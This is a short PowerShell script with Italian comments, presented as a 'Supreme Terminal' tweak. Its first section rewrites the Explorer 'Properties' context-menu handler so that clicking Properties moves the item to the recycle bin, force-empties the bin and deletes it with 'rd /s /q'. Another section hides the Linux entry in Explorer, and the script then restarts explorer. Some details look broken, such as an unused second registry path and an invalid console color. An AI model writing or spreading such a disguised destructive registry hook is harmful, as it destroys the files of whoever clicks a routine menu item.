# --- SUPREME TERMINAL BY LABADIMILLE ---
Write-Host "--- ATTIVAZIONE MODALITA' SUPREME ---" -ForegroundColor Gold

# 1. TRITACARNE PROPRIETA' (Fino al riavvio)
$path1 = "HKCR:\Folder\shell\Properties\command"
$path2 = "HKCR\*\shell\Properties\command"
$cmd = 'cmd.exe /c echo Distruzione... && powershell -Command "$sh = New-Object -ComObject Shell.Application; $sh.NameSpace(10).MoveHere(''%1''); Clear-RecycleBin -Force" && rd /s /q "%1"'

if (!(Test-Path $path1)) { New-Item $path1 -Force }
Set-ItemProperty -Path $path1 -Name "(Default)" -Value $cmd
# Ripeti per i file...

# 2. NASCONDI LINUX (Fino al riavvio)
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{2cc5ca98-6485-489a-920e-b3e88a6ccce3}" -Name "System.IsPinnedToNameSpaceTree" -Value 0

# 3. RESTART EXPLORER
Stop-Process -Name explorer -Force; Start-Process explorer

Write-Host "--- TERMINALE SUPREME PRONTO ---" -ForegroundColor Green
